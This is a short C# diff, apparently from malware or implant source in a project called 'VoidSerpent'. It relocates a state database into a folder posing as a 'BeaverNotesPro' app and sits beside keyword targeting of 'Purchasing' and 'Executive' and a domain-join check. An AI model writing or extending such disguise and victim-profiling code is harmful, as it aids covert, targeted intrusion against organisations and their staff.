@@ -646,7 +646,8 @@ namespace VoidSerpent
 
         public static void SoStrangeIRememberYou()
         {
-            var db = new DatabaseManager("syncstate.db");
+            string buPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\BeaverNotesPro");
+            var db = new DatabaseManager(Path.Combine(buPath, "syncstate.db"));
             string[] keywords = { "Purchasing", "Executive" };
             IntPtr domainNamePtr;
             NetJoinStatus joinStatus;
